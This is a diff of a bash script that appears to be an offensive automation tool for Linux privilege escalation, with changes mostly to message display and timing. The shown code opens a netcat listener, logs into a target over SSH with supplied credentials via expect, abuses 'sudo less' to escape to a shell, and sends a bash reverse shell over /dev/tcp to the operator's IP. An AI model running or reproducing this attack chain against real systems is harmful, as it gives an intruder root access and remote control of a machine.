@@ -516,7 +516,7 @@ echo -e "${PURPLE}##############################################################
 
 # Kernel Version in searchsploit
 
-MSG18="Checking Kernel Version..........$KVSE"
+MSG18="Checking Kernel Version.........."$KVSE
       while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSG18"
       sleep .05 
       echo
@@ -588,32 +588,34 @@ sleep 7
 
 menu_option_one() {
 
-    MSGA="ESTABLISHING CONNECTION FOR PRIVILEGE ESCALATION.......\nPLEASE HAVE
-    SOME PATIENCE AS THE REVERSE SHELL TAKES SOME TIME TO ESTABLISH......."
+    MSGA="ESTABLISHING CONNECTION FOR PRIVILEGE ESCALATION......."
+    MSGB="PLEASE HAVE SOME PATIENCE AS THE REVERSE SHELL TAKES SOME TIME TO ESTABLISH......."
       while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSGA"
+      echo
+      echo
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSGB"
     echo
     echo
     echo 'What is your ip address?'
     read -r LOCAL_IP
     echo
     echo
-    sleep 2
-    xterm -e 'nc -nlvp 8080' &
-    sleep 2
+    sleep .5 
+    xterm -geometry 90x30+0+150 -font *-fixed-*-*-*-20-* -e 'nc -nlvp 8080' &
+    sleep 1 
     expect -c "\
-    set timeout (5)
+    set timeout (3)
     set env(TERM)
-    sleep 2
     spawn ssh -t $USERNAME@$IP_ADDRESS
     sleep 1
     expect \"*assword*\r\"
     send \"$PASSWD\r\"
-    sleep 2
+    sleep .5 
     send \"sudo less /etc/profile\r\"
     sleep 1
     expect \"*assword*\r\"
     send \"$PASSWD\r\"
-    sleep 2
+    sleep .5 
     send \"!/bin/sh\r\"
     sleep 1
     send \"bash -i >& /dev/tcp/$LOCAL_IP/8080 0>&1\r\"
@@ -646,7 +648,6 @@ incorrect_selection() {
 
 until [ "$selection" = "1" ] || [ "$selection" = "3" ]; do
     clear
-    #echo "Would to Attempt Privilege Escalation Using Sudo 'less' ?"
     echo ""
     echo "  1 - Attempt Privilege Escalation Using Sudo 'less'? "
     echo "  2 - View file at ./I_AM_ROOT/$IP_ADDRESS/$REFI"
